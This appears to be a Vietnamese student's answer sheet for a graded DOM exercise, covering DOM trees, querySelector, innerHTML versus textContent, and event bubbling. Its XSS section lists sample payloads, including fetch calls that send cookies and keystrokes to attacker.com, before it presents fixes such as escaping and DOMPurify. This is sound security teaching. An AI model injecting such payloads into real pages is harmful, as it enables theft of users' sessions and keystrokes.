# PHẦN A — KIỂM TRA ĐỌC HIỂU (15 điểm)

## Câu A1 (5đ) — DOM Tree

### 1. Vẽ DOM tree cho HTML:

```
#document
└── #app (div#app)
    ├── header
    │   ├── h1
    │   │   └── "Todo App" (text)
    │   └── nav
    │       ├── a.active
    │       │   └── "All" (text)
    │       ├── a
    │       │   └── "Active" (text)
    │       └── a
    │           └── "Completed" (text)
    └── main
        ├── form#todoForm
        │   ├── input#todoInput
        │   └── button
        │       └── "Add" (text)
        └── ul#todoList
            ├── li.todo-item
            │   └── "Learn HTML" (text)
            └── li.todo-item.completed
                └── "Learn CSS" (text)
```

### 2. querySelector cho mỗi yêu cầu:

| Yêu cầu | querySelector |
|---------|--------------|
| Chọn thẻ `<h1>` | `document.querySelector("h1")` |
| Chọn input trong form | `document.querySelector("#todoForm input")` hoặc `document.querySelector("#todoInput")` |
| Chọn tất cả .todo-item | `document.querySelectorAll(".todo-item")` |
| Chọn link đang active | `document.querySelector("a.active")` hoặc `document.querySelector("nav a.active")` |
| Chọn `<li>` đầu tiên trong #todoList | `document.querySelector("#todoList li")` hoặc `document.querySelector("#todoList .todo-item:first-child")` |
| Chọn tất cả `<a>` bên trong `<nav>` | `document.querySelectorAll("nav a")` |

---

## Câu A2 (5đ) — innerHTML vs textContent

### Giải thích sự khác nhau:

| Tính chất | `innerHTML` | `textContent` |
|-----------|-----------|--------------|
| **Tác dụng** | Lấy/gán nội dung HTML (bao gồm tags) | Lấy/gán chỉ text thuần (không tags) |
| **Xử lý HTML** | Phân tích & render HTML tags | Coi HTML tags như text bình thường |
| **Hiệu năng** | Chậm hơn (cần parse HTML) | Nhanh hơn (chỉ text) |
| **Bảo mật** | ⚠️ **Nguy hiểm - XSS** | ✅ **An toàn** |

### Ví dụ khi nào dùng mỗi cái:

#### Dùng `innerHTML`:
```javascript
// Khi bạn muốn render HTML code (đã an toàn/kiểm duyệt):
const app = document.querySelector("#app");
app.innerHTML = `
    <h2>Welcome</h2>
    <p>Hello <strong>User</strong></p>
`;
// Output: Welcome | Hello User (với text đậm)
```

#### Dùng `textContent`:
```javascript
// Khi chỉ muốn hiển thị text:
const message = document.querySelector("#message");
message.textContent = "Price: $99.99";
// Output: Price: $99.99
// Không render HTML nếu có

// Khi user nhập vào - luôn dùng textContent
const userComment = document.querySelector("#comment-input").value;
document.querySelector("#display").textContent = userComment;
// Nội dung được display như text thuần, không thực thi HTML
```

### Ví dụ thực tế:

```javascript
const div = document.querySelector("div");

// innerHTML
div.innerHTML = "<b>Bold</b>";  // → Hiển thị: **Bold** (đậm)

// textContent
div.textContent = "<b>Bold</b>"; // → Hiển thị: <b>Bold</b> (như text)
```

---

### 🚨 Câu hỏi bảo mật: XSS Vulnerability

#### Tại sao innerHTML có thể gây lỗ hổng XSS?

**XSS (Cross-Site Scripting)** là tấn công inject code JavaScript độc hại vào trang web.

`innerHTML` **phân tích và thực thi** HTML code → nếu user input chứa script/event, nó sẽ chạy.

#### Ví dụ code minh họa - ĐÃ BÌNH LUẬN:

```javascript
// ⚠️ NGUY HIỂM - Không bao giờ làm thế này:
const userInput = document.querySelector("#search").value;
// Giả sử user nhập: <img src=x onerror="alert('Hacked!')">

document.querySelector("#result").innerHTML = userInput;
// → Trình duyệt sẽ chạy: alert('Hacked!')
// → Attacker có thể: đánh cắp cookies, session, redirect đến trang giả mạo, v.v.
```

#### Cách khác nhau để tấn công:

```javascript
// Hacker có thể nhập vào input:

// 1. Popup alert:
<img src=x onerror="alert('XSS!')">

// 2. Đánh cắp cookies:
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

// 3. Thêm keylogger:
<img src=x onerror="document.addEventListener('keydown', (e) => { fetch('http://attacker.com/log?key=' + e.key); })">

// 4. Redirect đến trang giả mạo:
<img src=x onerror="window.location='http://fake-bank.com'">
```

#### ✅ CÁC CÁCH SỬA:

**Cách 1: Dùng textContent thay vì innerHTML**
```javascript
const userInput = document.querySelector("#search").value;
document.querySelector("#result").textContent = userInput;
// ✅ An toàn - HTML tags được coi như text
```

**Cách 2: Escape HTML tags**
```javascript
function escapeHTML(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

const userInput = document.querySelector("#search").value;
const escapedInput = escapeHTML(userInput);
document.querySelector("#result").innerHTML = escapedInput;
// ✅ An toàn - tags bị escape thành text
```

**Cách 3: Sanitize bằng thư viện (Best Practice)**
```javascript
// Dùng DOMPurify hoặc tương tự
const userInput = document.querySelector("#search").value;
const cleanHTML = DOMPurify.sanitize(userInput);
document.querySelector("#result").innerHTML = cleanHTML;
// ✅ An toàn & linh hoạt - cho phép safe HTML, loại bỏ malicious code
```

**Tóm tắt - Best Practices:**
- ✅ Dùng `textContent` cho user input
- ✅ Escape HTML nếu phải dùng `innerHTML`
- ✅ Validate & sanitize dữ liệu trước khi render
- ⚠️ Tránh dùng `innerHTML` với dữ liệu từ user trực tiếp

---

## Câu A3 (5đ) — Event Bubbling

### Hiểu về Event Bubbling:

**Event bubbling** = sự kiện "nổi bọt" từ element bị click lên các element cha.

Thứ tự: `BUTTON` → `INNER` → `OUTER`

### HTML Structure:
```html
<div id="outer">
    <div id="inner">
        <button id="btn">Click me</button>
    </div>
</div>
```

### Scenario 1: Không có `stopPropagation()`

```javascript
document.querySelector("#outer").addEventListener("click", () => {
    console.log("OUTER");
});

document.querySelector("#inner").addEventListener("click", () => {
    console.log("INNER");
});

document.querySelector("#btn").addEventListener("click", (e) => {
    console.log("BUTTON");
    // stopPropagation() commented out
});
```

**Khi click vào button:**

```
Output:
BUTTON
INNER
OUTER
```

**Giải thích:**
1. Button được click → chạy event handler của button → `BUTTON`
2. Event "nổi bọt" lên parent (#inner) → `INNER`
3. Event tiếp tục nổi bọt lên grandfather (#outer) → `OUTER`

---

### Scenario 2: Với `stopPropagation()`

```javascript
document.querySelector("#btn").addEventListener("click", (e) => {
    console.log("BUTTON");
    e.stopPropagation();  // ← uncomment
});
```

**Khi click vào button:**

```
Output:
BUTTON
```

**Giải thích:**
1. Button được click → chạy event handler → `BUTTON`
2. `e.stopPropagation()` dừng sự kiện từ nổi bọt tiếp tục
3. Event không truyền lên parent/grandfather
4. Chỉ in `BUTTON` mà thôi

---

### Bảng so sánh:

| Điều kiện | Output |
|-----------|--------|
| **Bình thường (bubbling)** | `BUTTON` → `INNER` → `OUTER` |
| **Với stopPropagation()** | `BUTTON` (dừng tại đây) |

---

### Các phương thức khác liên quan:

```javascript
event.stopPropagation()      // Ngăn event bubble lên
event.preventDefault()        // Ngăn hành động mặc định (VD: form submit)
event.stopImmediatePropagation() // Ngăn bubble + các listener khác trên element này
```

### Ví dụ thực tế - Event Delegation (sử dụng bubbling):

```javascript
// Cách 1: Thêm listener cho mỗi item (không hiệu quả)
document.querySelectorAll(".item").forEach(item => {
    item.addEventListener("click", () => console.log("Clicked item"));
});

// Cách 2: Thêm listener cho parent (event delegation - tốt hơn)
document.querySelector(".list").addEventListener("click", (e) => {
    if (e.target.matches(".item")) {
        console.log("Clicked item:", e.target.textContent);
    }
});
```

---

## Tóm tắt 15 điểm:

| Câu | Điểm | Nội dung |
|-----|------|---------|
| **A1** | 5đ | DOM tree + querySelector (mỗi 1 đúng = 0.5đ × 10) |
| **A2** | 5đ | innerHTML vs textContent + XSS fix |
| **A3** | 5đ | Event bubbling prediction + stopPropagation |
